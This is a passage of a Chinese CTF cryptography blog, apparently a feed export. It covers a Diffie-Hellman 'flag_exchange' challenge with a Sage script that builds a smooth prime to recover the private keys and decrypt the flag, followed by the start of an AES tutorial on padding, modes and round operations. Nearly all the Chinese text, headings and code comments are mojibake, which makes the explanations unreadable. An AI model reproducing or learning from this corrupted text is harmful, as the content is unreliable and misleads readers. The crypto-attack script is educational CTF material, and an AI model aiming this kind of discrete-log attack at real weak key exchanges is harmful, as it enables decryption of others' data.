pow(A,b,p)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g,i,p) == A :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a:&quot;</span>,i,<span class="string">&quot;\t K=&quot;</span>,<span class="built_in">pow</span>(B,i,p))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g,i,p) == B:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;b:&quot;</span>,i,<span class="string">&quot;\t K=&quot;</span>,<span class="built_in">pow</span>(A,i,p))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">         </span><br><span class="line"><span class="comment"># a: 12552   K= 53919</span></span><br><span class="line"><span class="comment"># b: 7919    K= 53919</span></span><br></pre></td></tr></table></figure>

<h4 id="flag-exchange-ã€-è¿™ä¸ªè¿˜æ˜¯ä¸å¤ªæ‡‚-åé¢å­¦æ˜ç™½äº†å†å›æ¥çœ‹ã€‘"><a href="#flag-exchange-ã€-è¿™ä¸ªè¿˜æ˜¯ä¸å¤ªæ‡‚-åé¢å­¦æ˜ç™½äº†å†å›æ¥çœ‹ã€‘" class="headerlink" title="flag_exchange ã€ è¿™ä¸ªè¿˜æ˜¯ä¸å¤ªæ‡‚ åé¢å­¦æ˜ç™½äº†å†å›æ¥çœ‹ã€‘"></a>flag_exchange ã€ è¿™ä¸ªè¿˜æ˜¯ä¸å¤ªæ‡‚ åé¢å­¦æ˜ç™½äº†å†å›æ¥çœ‹ã€‘</h4><p>çœ‹å®Œè¿™é“ä¾‹é¢˜ å°±ç¨å¾®æœ‰ç‚¹å°è±¡äº† å½“ç„¶ä¸æ˜¯å®Œå…¨æ‡‚ å†çœ‹ä¸‹å¯¹åº”çš„é¢˜ç›®</p>
<p>ä¹‹å‰çš„moectf flag_exchange ä¹Ÿæ˜¯ä½¿ç”¨è¯¥åŠ å¯†ç®—æ³•<code>         </code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line">  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">diffie_hellman</span>(<span class="params">p, flag</span>):</span><br><span class="line">    alice_privKey = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    alice_pubKey = <span class="built_in">pow</span>(<span class="number">7</span>, alice_privKey, p)</span><br><span class="line">    bob_privKey = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    bob_pubKey = <span class="built_in">pow</span>(<span class="number">7</span>, bob_privKey, p)</span><br><span class="line">    <span class="comment"># aK =  7^ak mod p</span></span><br><span class="line">    <span class="comment"># bK =  7^bk mod p</span></span><br><span class="line">  </span><br><span class="line">    superkey = <span class="built_in">pow</span>(bob_pubKey, alice_privKey, p)</span><br><span class="line">    <span class="comment"># K = bK ^ ak mod p</span></span><br><span class="line">    m = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> (m * superkey) % p, alice_pubKey, bob_pubKey</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># m*SK mod p    aK     bK</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>(<span class="params"><span class="built_in">input</span>:<span class="type">Callable</span>[[<span class="built_in">str</span>],<span class="literal">None</span>], <span class="built_in">print</span>:<span class="type">Callable</span>[[<span class="built_in">str</span>],<span class="literal">None</span>]</span>):</span><br><span class="line">    p = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;P = &quot;</span>))</span><br><span class="line">    <span class="comment"># å¤§ç´ æ•°p</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> p.bit_length() &gt;= <span class="number">1024</span>:</span><br><span class="line">        c, alice_pubKey, bob_pubKey = diffie_hellman(p, flag)</span><br><span class="line">        <span class="comment">#  c = m*SK mod p  =&gt;  m = c*Sk^-1 mod p</span></span><br><span class="line">         </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Alice&#x27;s public key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(alice_pubKey))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Bob&#x27;s public key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(bob_pubKey))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Ciphertext: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid P&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆä¸€ä¸ªå…‰æ»‘ç´ æ•°p</p>
<p>g = 7</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B = 7 ^ b mod p</span><br><span class="line">A = 7 ^ a mod p </span><br><span class="line">è¿™é‡Œçš„ A B æ˜¯ç”±è‡ªå®šä¹‰a  b è®¡ç®—è€Œæ¥</span><br><span class="line"></span><br><span class="line">éšåå¯å¾—superkey </span><br><span class="line">SK = B^a mod p </span><br><span class="line">ç®—å‡ºsuperkey </span><br><span class="line">#  c = m*SK mod p  =&gt;  m = c*SK^-1 mod p</span><br><span class="line">må³flag</span><br></pre></td></tr></table></figure>

<p>WP æœ‰ç‚¹çœ‹ä¸æ‡‚ æ„Ÿè§‰A B cæ˜¯è‡ªå·±å®šä¹‰ç”Ÿæˆçš„ å¦‚æœæ˜¯è‡ªå·±ç”Ÿäº§çš„è¯ é‚£å°±æ¯”è¾ƒå¥½ç†è§£</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># æ„é€ ä¸€ä¸ªå¾ˆå…‰æ»‘çš„pï¼Œå³på¯ä»¥åˆ†è§£æˆè®¸å¤šå°ç´ æ•°ä¹‹ç§¯</span></span><br><span class="line">p = <span class="number">1</span></span><br><span class="line">i = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> isPrime(p+<span class="number">1</span>) ==<span class="literal">False</span> <span class="keyword">or</span> p.bit_length()&lt;<span class="number">1024</span> :</span><br><span class="line">    p *= i</span><br><span class="line">    i = gmpy2.next_prime(i)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#print(p+1) å–p+1ä¸ºå¯¹åº”ç´ æ•°p</span></span><br><span class="line"><span class="comment"># A B c ??? æ„Ÿè§‰åƒæ˜¯è‡ªå·±æ„é€ ç”Ÿæˆçš„</span></span><br><span class="line"> </span><br><span class="line">g = <span class="number">7</span></span><br><span class="line">p = <span class="number">20404068993016374194542464172774607695659797117423121913227131032339026169175929902244453757410468728842929862271605567818821685490676661985389839958622802465986881376139404138376153096103140834665563646740160279755212317501356863003638612390661668406235422311783742390510526587257026500302696834793248526734305801634165948702506367176701233298064616663553716975429048751575597150417381063934255689124486029492908966644747931</span></span><br><span class="line">A = <span class="number">20336091449271352050000450320351597189353592062279377142884247684088072216754371140723688503847322269500056016823378486967669507529408071986247421480538070427020298314420596325895121922786822444746298488308935254197730980462214370281102952073051791017954008911348128021296665124600273965642418702110947948173149809724203543773244607616601110670126605337319276524135448598308833199821995622969372761107826550795621362415457182</span></span><br><span class="line">B = <span class="number">3016038452071464751422492594184606815201979377859418872430468328543181786920301668755954977729921559697635702877324759319811639923934643618711315555467453055288843246623654939387741368313873206560664229687375070952935800932126812264287402142801364732994539469801252414404987968911552061069354407508916590343552775560281691608737262245571829068155383159065889848197300894149747651679644288337413872066182471443965426404626423</span></span><br><span class="line">c = <span class="number">8101058129734054038632640353434785588447342802920921913999474154497466343094694993166042668700504613189281291125022077749043805204765309971981658929422844998392130190493145455241084775180221325627765838099393607299071835294706132501949635214088146102721237571159346281928107966372652823580266088579392328383545323322931789769149936581855383571990955947284354676448353798975087410774586309247023597516943906734455833918792577</span></span><br><span class="line"> </span><br><span class="line">a = discrete_log(mod(A,p),mod(g,p))</span><br><span class="line"> </span><br><span class="line">b = discrete_log(mod(B,p),mod(g,p))</span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"><span class="comment"># print(b)</span></span><br><span class="line"> </span><br><span class="line">superkey = <span class="built_in">pow</span>(B, a, p)</span><br><span class="line"> </span><br><span class="line">p = gmpy2.mpz(p)</span><br><span class="line">superkey = gmpy2.mpz(superkey)</span><br><span class="line"> </span><br><span class="line">d = gmpy2.invert(superkey,p) % p</span><br><span class="line">m = c*d % p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFå¯†ç å­¦ä¹‹AESåŠ å¯†</title>
    <url>/posts/b568ee4f/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>AESåŠ å¯†ç®—æ³•æ˜¯å¯†ç å­¦ä¸­çš„é«˜çº§åŠ å¯†æ ‡å‡†ï¼Œå±äºå¯¹ç§°ã€åˆ†ç»„åŠ å¯†ç®—æ³•ï¼Œåœ¨CTFç°ä»£å¯†ç å­¦ä¸­ä½œä¸ºä¸€ä¸ªæ¯”è¾ƒå¸¸è€ƒçš„é¢˜ç›®ï¼Œæœ¬ç¯‡ä¼šå¯¹AESåŠ å¯†ç®—æ³•åšè¾ƒä¸ºè¯¦ç»†çš„è®²è§£ï¼Œå¹¶å¯¹ä¸€äº›AESé¢˜å‹è¿›è¡Œåˆ†ææ€»ç»“ã€‚</p>
<h3 id="AESåŸºç¡€"><a href="#AESåŸºç¡€" class="headerlink" title="AESåŸºç¡€"></a>AESåŸºç¡€</h3><p>AESç®—æ³•ï¼Œæ˜¯DESç®—æ³•çš„æ›¿ä»£è€…ï¼Œå±äºå½“ä»Šæœ€ä¸ºæµè¡Œçš„å¯¹ç§°åŠ å¯†ç®—æ³•ä¹‹ä¸€ã€‚ è¦æƒ³å…·ä½“äº†è§£å­¦ä¹ AESç®—æ³•ï¼Œé¦–å…ˆè¦æ¸…æ¥šä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µï¼š<strong>å¯†é’¥ã€å¡«å……ã€æ¨¡å¼</strong>ã€‚</p>
<h4 id="å¯†é’¥"><a href="#å¯†é’¥" class="headerlink" title="å¯†é’¥"></a>å¯†é’¥</h4><p>å¯†é’¥æ˜¯AESç®—æ³•å®ç°åŠ å¯†å’Œè§£å¯†çš„æ ¹æœ¬ã€‚AESæ”¯æŒ3ç§é•¿åº¦çš„å¯†ç   128ä½ã€192ä½ã€256ä½ã€‚</p>
<p>ä»å®‰å…¨æ€§æ¥çœ‹ï¼ŒAES256å®‰å…¨æ€§æœ€é«˜ã€‚ä»æ€§èƒ½æ¥çœ‹ï¼ŒAES128æ€§èƒ½æœ€é«˜ã€‚å…¶æœ¬è´¨åŸå› æ˜¯ä»–ä»¬çš„åŠ å¯†å¤„ç†è½®æ•°ä¸åŒã€‚</p>
<p>AESçš„åŠ å¯†æ ‡å‡†ä¸­ï¼Œæ¯ä¸ªåˆ†ç»„çš„ é•¿åº¦å›ºå®šä¸º128bits(16Bytes)ï¼Œå¯†é’¥é•¿åº¦ä¸º128bitsï¼Œ192bitsï¼Œ256bits,ä¸åŒçš„å¯†é’¥é•¿åº¦æœ‰ä¸åŒçš„åŠ å¯†è½®æ•°,æ ¹æ®é•¿åº¦ä¸åŒå¯ä»¥åˆ†ä¸ºAES-128ï¼ŒAES-192ï¼ŒAES-256ã€‚</p>
<table>
<thead>
<tr>
<th>AESåŠ å¯†</th>
<th>å¯†é’¥é•¿åº¦</th>
<th>åˆ†ç»„é•¿åº¦</th>
<th>åŠ å¯†è½®æ•°</th>
</tr>
</thead>
<tbody><tr>
<td>AES-128</td>
<td>128bits</td>
<td>128bits</td>
<td>10</td>
</tr>
<tr>
<td>AES-192</td>
<td>192bits</td>
<td>128bits</td>
<td>12</td>
</tr>
<tr>
<td>AES-256</td>
<td>256bits</td>
<td>128bits</td>
<td>14</td>
</tr>
</tbody></table>
<h4 id="å¡«å……"><a href="#å¡«å……" class="headerlink" title="å¡«å……"></a>å¡«å……</h4><p>åœ¨AESåŠ å¯†ä¸­ æœ‰å…­ç§å¡«å……æ¨¡å¼ï¼Œåˆ†åˆ«ä¸º <strong>NoPadding, PKCS#5, PKCS#7, ISO 10126, ANSI X9.23å’ŒZerosPadding</strong> ã€‚</p>
<ul>
<li>Nopadding ï¼šä¸è¿›è¡Œå¡«å……</li>
<li>ZerosPaddingï¼šç¼ºå°‘çš„å­—èŠ‚å…¨éƒ¨ä½¿ç”¨ 0x00å¡«å……</li>
<li>PKCS#5 &amp; PKCS#7ï¼šç¼ºå°‘å‡ ä¸ªå­—èŠ‚å°±å¡«å……å‡ ä¸ªå­—èŠ‚ï¼Œå€¼ä¸ºå¡«å……çš„å­—ç¬¦æ•°</li>
</ul>
<blockquote>
<p>ä¾‹å¦‚,AAAAAAAA  BBBBBBBB CCCCCCCC    åˆšå¥½åˆ†æˆ3ä¸ªåˆ†ç»„       </p>
<pre><code>     AAAAAAAA  BBBBBBBB CCCCC\____    ç¼ºå°‘3ä¸ªå­—èŠ‚ æ‰€ä»¥ä½¿ç”¨ 0x03è¿›è¡Œå¡«å……      
</code></pre>
<p> (è¿™é‡Œä¾‹å­çš„A B C å‡è§†ä¸ºä¸€ä¸ªå­—èŠ‚ ä»¥pkcs5ä¸ºä¾‹ 8ä¸ªå­—èŠ‚ä¸ºä¸€ç»„)</p>
<p>å¦‚æœæ˜æ–‡å—å°äº16ä¸ªå­—èŠ‚(128bit) é‚£ä¹ˆåœ¨æ˜æ–‡å—æœ«å°¾è¡¥è¶³å“åº”æ•°é‡çš„å­—ç¬¦ï¼Œä¸”æ¯ä¸ªå­—ç¬¦çš„å€¼ä¸ºå¡«å……å­—ç¬¦æ•°ï¼ˆç¼ºå°‘çš„å­—ç¬¦æ•°ï¼‰</p>
<p>æ¯”å¦‚æ˜æ–‡æŒ‰ç…§16ä¸ªå­—èŠ‚ä¸ºä¸€ç»„çš„è¯ï¼š{1,2,3,4,5,a,b,c,d,e}ï¼Œç¼ºå°‘6ä¸ªå­—èŠ‚ã€128/8-10=6ã€‘ï¼Œåˆ™è¡¥å…¨ä¸º{1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6}</p>
<p>ã€ä¸åŒåœ¨äº PKCS5 é™å®šäº†å—å¤§å°ä¸º 8bytesï¼Œè€ŒPKCS7æ²¡æœ‰é™å®šï¼Œåœ¨AESåŠ å¯†å½“ä¸­ä¸¥æ ¼æ¥è¯´æ˜¯ä¸èƒ½ä½¿ç”¨pkcs5çš„ï¼Œå› ä¸ºAESçš„å—å¤§å°æ˜¯ <strong>16bytes</strong>ï¼Œè€Œ pkcs5 åªèƒ½ç”¨äº <strong>8bytes</strong>ï¼Œé€šå¸¸æˆ‘ä»¬åœ¨AESåŠ å¯†ä¸­æ‰€è¯´çš„ pkcs5 æŒ‡çš„å°±æ˜¯ pkcs7ã€‘</p>
</blockquote>
<ul>
<li>ISO 10126ï¼šæœ€åä¸€ä¸ªå­—èŠ‚æ˜¯å¡«å……çš„å­—èŠ‚æ•°ï¼ˆåŒ…æ‹¬æœ€åä¸€å­—èŠ‚ï¼‰ï¼Œå…¶ä»–å…¨éƒ¨å¡«éšæœºæ•°</li>
</ul>
<blockquote>
<p>â€¦ | DD DD DD DD DD DD DD DD | DD DD DD DD 81 A6 23 04 | â€¦ </p>
</blockquote>
<ul>
<li>ANSI X9.23ï¼šå’ŒISO 10126ç›¸ä¼¼ï¼Œæœ€åä¸€ä¸ªå­—èŠ‚æ˜¯å¡«å……çš„å­—èŠ‚æ•°ï¼ŒåŒºåˆ«åœ¨ è¿™ç§æ–¹æ³•å¡«å……çš„å…¶ä»–å­—èŠ‚éƒ½æ˜¯0ï¼Œè€Œä¸æ˜¯éšæœºæ•°</li>
</ul>
<blockquote>
<p>â€¦ | DD DD DD DD DD DD DD DD | DD DD DD DD 00 00 00 04 | â€¦ </p>
</blockquote>
<h4 id="æ¨¡å¼"><a href="#æ¨¡å¼" class="headerlink" title="æ¨¡å¼"></a>æ¨¡å¼</h4><p>AESåˆ†ç»„åŠ å¯†çš„åŠ å¯†æ¨¡å¼å…±äº”ç§å¯é€‰åŠ å¯†æ¨¡å¼ã€‚ï¼ˆå¦‚æœåœ¨åŠ å¯†æ—¶ä½¿ç”¨äº†æŸç§å·¥ä½œæ¨¡å¼ï¼Œåˆ™è§£å¯†æ—¶ä¹Ÿå¿…é¡»ä½¿ç”¨åŒç§å·¥ä½œæ¨¡å¼ï¼‰</p>
<blockquote>
<p><strong>ECB</strong> ( Electronic Codebook Book , ç”µè¯æœ¬æ¨¡å¼ ï¼Œé»˜è®¤)<br><strong>CBC</strong> ( Cipher Block Chaining , å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼ )<br>CTR ( Counter , è®¡ç®—å™¨æ¨¡å¼ )<br>CFB ( Cipher FeedBack , å¯†ç åé¦ˆæ¨¡å¼ )<br>OFB ( Output FeedBack , è¾“å‡ºåé¦ˆæ¨¡å¼ )</p>
</blockquote>
<p>åœ¨CTFä¸­æ¯”è¾ƒå¸¸è§çš„ä¸º<strong>ECBæ¨¡å¼</strong>å’Œ<strong>CBCæ¨¡å¼</strong>ï¼Œéƒ½å±äºåˆ†ç»„å¯†ç ç®—æ³•ï¼ˆåˆ†ç»„å¯†ç ç®—æ³•æœ‰å››ç§æ¨¡å¼ï¼šCBC/ECB/CFB/OCBï¼‰ï¼Œä¸»è¦ä»‹ç»ä¸‹ECBæ¨¡å¼å’ŒCBCæ¨¡å¼ã€‚</p>
<h5 id="ECBæ¨¡å¼"><a href="#ECBæ¨¡å¼" class="headerlink" title="ECBæ¨¡å¼"></a>ECBæ¨¡å¼</h5><p>ECBæ¨¡å¼(ç”µè¯æœ¬)ï¼Œä¾æ¬¡å‡ºæ¥ä¸€ç»„æ˜æ–‡åˆ†å—ï¼Œæ¯æ¬¡ä½¿ç”¨ç›¸åŒçš„å¯†é’¥åŠ å¯†ã€‚</p>
<p>å…¶åŠ å¯†æ¨¡å¼å¦‚ä¸‹æ‰€ç¤ºï¼Œå¦‚æœåŠ å¯†çš„æ˜æ–‡å—å†…å®¹ç›¸åŒï¼Œé‚£ä¹ˆå¾—åˆ°çš„å¯†æ–‡å—ä¹Ÿå°±ä¼šç›¸åŒï¼Œç›¸å¯¹æ¥è¯´ä¸å¤Ÿå®‰å…¨ï¼Œåªé€‚ç”¨äºæ˜æ–‡è¾ƒçŸ­æ—¶ã€‚</p>
<p><img src="/posts/b568ee4f/1.png"></p>
<h5 id="CBCæ¨¡å¼"><a href="#CBCæ¨¡å¼" class="headerlink" title="CBCæ¨¡å¼"></a>CBCæ¨¡å¼</h5><p>CBCæ¨¡å¼(å¯†æ–‡åˆ†ç»„é“¾æ¥)ï¼Œä¸€æ¬¡å¤„ç†ä¸€ç»„æ˜æ–‡åˆ†å—ï¼Œæ¯æ¬¡ä½¿ç”¨ç›¸åŒçš„å¯†é’¥åŠ å¯†ã€‚CBCæ¨¡å¼ä¸»è¦å¼•ç”¨äº†ä¸€ä¸ªåˆå§‹åŒ–å‘é‡(IV)æ¥åŠ å¼ºå¯†ç çš„éšæœºæ€§ï¼Œä¿è¯ç›¸åŒæ˜æ–‡é€šè¿‡ç›¸åŒå¯†é’¥çš„åŠ å¯†ç»“æœä¸åŒã€‚</p>
<p><img src="/posts/b568ee4f/2.png"></p>
<h3 id="AESåŠ å¯†æµç¨‹"><a href="#AESåŠ å¯†æµç¨‹" class="headerlink" title="AESåŠ å¯†æµç¨‹"></a>AESåŠ å¯†æµç¨‹</h3><p>ç®€è¦æ­¥éª¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/posts/b568ee4f/3.png"></p>
<p>1.å°†æ˜æ–‡æŒ‰ç…§128bitè¿›è¡Œåˆ†ç»„ï¼Œæ‹†åˆ†æ¬¡è‹¥å¹²ä¸ªæ˜æ–‡å—ï¼›</p>
<p>2.æŒ‰ç…§é€‰æ‹©çš„å¡«å……æ¨¡å¼å¯¹æœ€åä¸€å—æ˜æ–‡å—è¿›è¡Œå¡«å……ï¼›</p>
<p>3.æ¯ä¸ªæ˜æ–‡å—åˆ©ç”¨AESåŠ å¯†å™¨å’Œå¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°å¯¹åº”çš„å¯†æ–‡å—ï¼›</p>
<p>4.æ‹¼æ¥æ‰€æœ‰çš„å¯†æ–‡å—å¾—åˆ°æœ€ç»ˆåŠ å¯†çš„å¯†æ–‡ã€‚</p>
<h4 id="AESå…·ä½“åŠ å¯†æµç¨‹"><a href="#AESå…·ä½“åŠ å¯†æµç¨‹" class="headerlink" title="AESå…·ä½“åŠ å¯†æµç¨‹"></a>AESå…·ä½“åŠ å¯†æµç¨‹</h4><p>AESç®—æ³•ä¸»è¦æœ‰å››ä¸ªæ“ä½œå¤„ç†ï¼Œåˆ†åˆ«ä¸º è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰ã€å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰ã€è¡Œä½ç§»ï¼ˆShiftRowsï¼‰ã€åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰ã€‚</p>
<p>åœ¨è¿›è¡ŒåŠ å¯†å‰ï¼Œæ˜æ–‡å’Œå¯†é’¥éƒ½ä¼šåˆ†ç»„ä¸º16å­—èŠ‚(128bit)ç»„æˆçš„å—ï¼ŒæŒ‰ç…§è‡ªå·±çš„å…ˆåé¡ºåºï¼Œè‡ªä¸Šè€Œä¸‹ï¼Œä»å·¦å¾€å³ä¾æ¬¡æ’åˆ—ã€‚åŠ å¯†åçš„å¯†æ–‡è¯»å–ä¹Ÿæ˜¯æŒ‰ç…§è¿™ä¸ªé¡ºåºã€‚</p>
<p>(ä»¥ä¸‹å¤šå¤„å›¾ç‰‡å‡å¼•è‡ª<a href="https://bbs.kanxue.com/thread-253884.htm">https://bbs.kanxue.com/thread-253884.htm</a> æ„Ÿè°¢è¿™ä½å¸ˆå‚…çš„æ–‡ç«  è®²è§£çš„å¾ˆè¯¦ç»†)</p>
<p><img src="/posts/b568ee4f/4.png"></p>
<p>AESç®—æ³•åœ¨å¤„ç†è½®æ•°ä¸Šä¹Ÿæœ‰ç‚¹ä¸åŒï¼Œåœ¨æœ€åä¸€è½®ä¸­å°‘äº†åˆ—æ··æ·†å¤„ç†ã€‚</p>
<p>åˆå§‹è½®ï¼ˆ1ï¼‰</p>
<ul>
<li>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</li>
</ul>
<p>æ™®é€šè½®ï¼ˆN-1)</p>
<ul>
<li>å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰</li>
<li>è¡Œä½ç§»ï¼ˆShiftRowsï¼‰</li>
<li>åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰</li>
<li>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</li>
</ul>
<p>æœ€ç»ˆè½®ï¼ˆ1ï¼‰ </p>
<ul>
<li>å­—èŠ‚æ›¿æ¢ ï¼ˆSubBytesï¼‰</li>
<li>è¡Œä½ç§» ï¼ˆShiftRowsï¼‰</li>
<li>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</li>
</ul>
<p><img src="/posts/b568ee4f/5.png"></p>
<h5 id="è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰"><a href="#è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰" class="headerlink" title="è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰"></a>è½®å¯†é’¥åŠ ï¼ˆAddRoundKeyï¼‰</h5><p>æ ¹æ®ä¼ å…¥çš„è½®æ•° å°†çŠ¶æ€çŸ©é˜µä¸å¯¹åº”çš„W[i]å¼‚æˆ–ï¼Œè¯¥è¿‡ç¨‹ä¸­æœ‰ä¸¤ä¸ªè¾“å…¥å‚æ•°ï¼Œåˆ†åˆ«ä¸ºæ˜æ–‡å’Œå­å¯†é’¥k  éƒ½æ˜¯128ä½(bit) [16å­—èŠ‚]ã€‚</p>
<p><img src="/posts/b568ee4f/6.png"></p>
<h5 id="å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰"><a href="#å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰" class="headerlink" title="å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰"></a>å­—èŠ‚æ›¿æ¢ï¼ˆSubBytesï¼‰</h5><p>AESå­—èŠ‚æ›¿æ¢  ç®€å•è¯´å°±æ˜¯ä¸€ä¸ª<strong>æŸ¥è¡¨æ“ä½œ</strong> ã€‚åœ¨AESä¸­å®šä¹‰äº†ä¸€ä¸ªSç›’å’Œ é€†Sç›’</p>
<p><img src="/posts/b568ee4f/7.png"></p>
<p><img src="/posts/b568ee4f/8.png"></p>
<p><img src="/posts/b568ee4f/9.png"></p>
<p>å¦‚ä¸Šå›¾ a[0,0]æ˜¯ 0x12  æŸ¥sç›’  [1,2]å¤„ å¾—åˆ° 0xC9ï¼›a[0,1]æ˜¯ 0xAB  æŸ¥sç›’ [A,B]å¤„ ä¹Ÿå°±æ˜¯ [10,11] å¾—åˆ°  0x62ã€‚</p>
<p>å¦‚æœæ˜¯é€†sç›’ é‚£æ–¹æ³•ä¹Ÿæ˜¯ç›¸åŒï¼Œä»¥ 0xC9ä¸ºä¾‹ï¼Œ æŸ¥é€†sç›’ [C,9] å³ [13,9]ï¼Œå¯¹åº”è¡¨ä¸­å€¼ä¸º 0x12 </p>
<h5 id="è¡Œä½ç§»ï¼ˆShiftRowsï¼‰"><a href="#è¡Œä½ç§»ï¼ˆShiftRowsï¼‰" class="headerlink" title="è¡Œä½ç§»ï¼ˆShiftRowsï¼‰"></a>è¡Œä½ç§»ï¼ˆShiftRowsï¼‰</h5><p>è¡Œä½ç§»  å°†è¾“å…¥çš„æ•°æ®ä½œä¸ºä¸€ä¸ª4x4çŸ©é˜µè¿›è¡Œå¤„ç†  å¯ä»¥ç†è§£ä¸º å·¦å¾ªç¯ä½ç§» æ“ä½œ</p>
<p>ç¬¬ä¸€è¡Œä¿æŒä¸å˜ï¼Œç¬¬äºŒè¡Œå·¦ç§»1å­—èŠ‚ ï¼Œç¬¬ä¸‰è¡Œå·¦ç§»2å­—èŠ‚ï¼Œç¬¬å››è¡Œå·¦ç§»3å­—èŠ‚</p>
<p><img src="/posts/b568ee4f/10.png"></p>
<p>é€†å‘è¡Œä½ç§»</p>
<p>ç¬¬ä¸€è¡Œä¿æŒä¸å˜ï¼Œç¬¬äºŒè¡Œå³ç§»1å­—èŠ‚ï¼Œç¬¬ä¸‰è¡Œå³ç§»2å­—èŠ‚ï¼Œç¬¬å››è¡Œå³ç§»3å­—èŠ‚</p>
<p><img src="/posts/b568ee4f/11.png"></p>
<h5 id="åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰"><a href="#åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰" class="headerlink" title="åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰"></a>åˆ—æ··æ·†ï¼ˆMixColumnsï¼‰</h5><p>åˆ—æ··åˆå˜æ¢å°±æ˜¯çŸ©é˜µç›¸ä¹˜ï¼Œè¡Œä½ç§»åçš„çŠ¶æ€çŸ©é˜µå’Œä¿®è¡¥çŸ©é˜µ(fixed matrix) åšçŸ©é˜µç›¸ä¹˜ï¼Œå¾—å‡ºè¾“å‡ºåˆ—ã€‚</p>
<p><img src="/posts/b568ee4f/12.png"></p>
<p>é€†å‘åˆ—æ··æ·†</p>
<p>åœ¨è§£å¯†çš„é€†å‘åˆ—æ··æ·†ä¸­ ä¸æ­£å‘åˆ—æ··æ·†çš„ å·¦ä¹˜çŸ©é˜µä¸åŒï¼Œäº’ä¸ºé€†çŸ©é˜µã€‚ã€å³ æ•°æ®çŸ©é˜µåŒæ—¶ä¹˜è¿™ä¸¤ä¸ªçŸ©é˜µåä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‘</p>
<p><img src="/posts/b568ee4f/13.png"></p>
<h3 id="AES-ECBæ¨¡å¼"><a href="#AES-ECBæ¨¡å¼" class="headerlink" title="AES-ECBæ¨¡å¼"></a>AES-ECBæ¨¡å¼</h3><p><img src="/posts/b568ee4f/14.png"></p>
<p>1.æ˜æ–‡ç»è¿‡å¡«å……åï¼Œåˆ†ä¸ºä¸åŒçš„ç»„blockï¼Œä»¥ç»„çš„æ–¹å¼å¯¹æ•°æ®è¿›è¡Œå¤„ç†</p>
